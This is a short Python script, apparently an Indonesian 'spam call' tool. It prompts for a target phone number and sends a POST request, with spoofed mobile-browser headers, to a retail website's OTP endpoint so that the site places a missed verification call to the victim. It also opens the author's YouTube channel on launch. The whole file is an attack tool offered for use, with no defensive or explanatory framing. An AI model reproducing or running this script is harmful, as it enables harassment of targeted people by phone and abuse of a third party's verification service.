import requests as rek
import json,os,sys

## Logo/Tampilan
logo = """
        * Spamâ€¢Call *

 {Ã—} Creator : Kang_Virus
 {Ã—} Youtube : Aing_Arip
 {Ã—} Github  : https://github.com/Ahmadripai04
Â«~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Â»\n"""

os.system('clear')
print(logo)
os.system("xdg-open  https://youtube.com/channel/UCWZ3J4FhBdl20D7f6Fl8itw")
## Menginput No Target
target = input(" Target Call : ")

## Web Api Spam Call
api_url = "https://www.nutriclub.co.id/otp/?phone=0"+target+"&old_phone=0"+target

headers = {
"Host": "www.nutriclub.co.id",
"content-length": "0","accept": 
"application/json, text/javascript, */*; q=0.01",
"x-requested-with": "XMLHttpRequest",
"save-data": "on",
"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
"origin": "https://www.nutriclub.co.id",
"sec-fetch-site": "same-origin",
"sec-fetch-mode": "cors",
"sec-fetch-dest": "empty","referer": "https://www.nutriclub.co.id/account/register",
}

## Merespon dari api_url ke bentuk .text
respon = rek.post(api_url,headers).text
## Status yg suudah di respon, menjadi "StatusMessage"
status = json.loads(respon)["StatusMessage"]
if status == "Request misscall berhasil":
     print("\n {âœ“} Call to "+ target +" Berhasil \n")
else:
     print("\n {Ã—} Spam sudah dilakukan 3x Â» Gagal \n")
